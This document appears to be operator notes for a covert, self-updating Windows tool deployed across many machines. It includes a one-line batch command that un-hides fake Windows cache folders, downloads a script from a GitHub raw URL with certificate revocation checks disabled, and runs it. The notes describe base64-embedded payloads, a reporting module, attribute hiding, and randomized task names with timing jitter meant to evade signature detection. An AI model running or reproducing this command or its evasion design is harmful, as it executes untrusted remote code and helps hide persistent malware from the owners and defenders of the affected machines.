## Machines stuck on old builds (T4 footer / not self-updating) — un-harden first, then deploy
S4 hardening (+h +s attribs) silently blocked every copy/move self-update. O20 strips attrs before
every write and S5 no longer locks mutable payloads. On frozen machines run this FIRST, then the deploy line:
```bat
attrib -h -s -r "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\*" & attrib -h -s -r "C:\Windows\Temp\.wucache\*" & attrib -h -s -r "C:\ProgramData\Microsoft\Diagnosis\State\.etlcache\*" & curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o20" && call %TEMP%\own.cmd
```
own.txt is now the full self-contained O20 build: embeds own_mon M11 + own_secure S5 + tg_report T7 + own_lib L1 as base64.
O20 fix: S4 hardening attr-locked the fleet (copy/move over +h +s fails silently) - O20 strips attrs before writes, verifies runner copies by build marker, S5 stops locking mutable payloads, M11 self-update unhardens before move.
O19 repair: all 4 embedded payload blocks regenerated byte-exact from sources (chunked StrReplace edits had corrupted B64_MON with phase-shifted base64 + B64_SEC/TGR/LIB were stale).
O16 fixes the launcher detach bug (RUNNER expanded at parse-time inside block -> empty -> bare-quote cmd error / fake Detached OK).
Works even if every other repo file is blocked; repo is only used for auto-updates afterwards.

- Self-contained single-file deploy: 4 payloads embedded as base64 inside own.cmd.
- Anti-signature identity: per-host task names (8-name pools x 4 slots) + 2-5 min jitter, seeded by COMPUTERNAME hash -> identity.cfg.
